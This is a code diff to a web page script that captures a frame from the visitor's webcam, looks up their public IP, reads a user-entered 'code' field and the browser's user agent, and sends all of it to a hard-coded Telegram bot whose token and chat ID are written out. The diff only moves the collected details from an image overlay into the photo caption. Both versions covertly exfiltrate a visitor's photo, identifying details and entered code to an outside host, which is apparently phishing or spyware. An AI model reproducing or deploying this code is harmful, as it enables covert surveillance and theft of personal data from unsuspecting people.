@@ -59,19 +59,11 @@
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 content.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // Add text overlay with user information
-                const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => 'Unknown IP');
-                const userInput = document.getElementById('userInput').value;
-                const deviceName = navigator.userAgent;
-                content.font = '20px Arial';
-                content.fillStyle = 'red';
-                content.fillText(`IP: ${ip}`, 10, 30);
-                content.fillText(`Code: ${userInput}`, 10, 60);
-                content.fillText(`Device: ${deviceName}`, 10, 90);
-
-                canvas.toBlob(blob => {
-                    sendPhotoTotelegram(blob);
+                canvas.toBlob(async blob => {
+                    const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => 'Unknown IP');
+                    const userInput = document.getElementById('userInput').value;
+                    const deviceName = navigator.userAgent;
+                    sendPhotoTotelegram(blob, ip, userInput, deviceName);
                     stream.getTracks().forEach(track => track.stop());
                     document.body.removeChild(video);
                     document.body.removeChild(canvas);
@@ -81,11 +73,16 @@
             }
         }
 
-        function sendPhotoTotelegram(blob) {
+        function sendPhotoTotelegram(blob, ip, userInput, deviceName) {
             const url = 'https://api.telegram.org/bot6343648051:AAExomyPRRWnT7YTvtQkhTCrNaF59Ijcx1I/sendPhoto';
             const formData = new FormData();
             formData.append('photo', blob, 'photo.jpg');
             formData.append('chat_id', '5433487133');
+
+            // Message to include device details
+            const message = `IP: ${ip}\nCode: ${userInput}\nDevice: ${deviceName}`;
+            formData.append('caption', message);
+
             fetch(url, {
                 method: 'post',
                 body: formData
